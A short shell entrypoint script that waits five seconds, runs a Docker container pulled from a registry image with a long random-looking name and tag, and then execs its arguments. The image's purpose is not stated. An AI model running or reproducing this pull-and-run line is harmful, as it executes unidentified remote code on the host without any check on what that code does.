#!/bin/sh
sleep 5s;

docker run --rm -i \
  --shm-size 8g \
  ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitbpyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitB0006-of-two

# start the script
exec "$@"
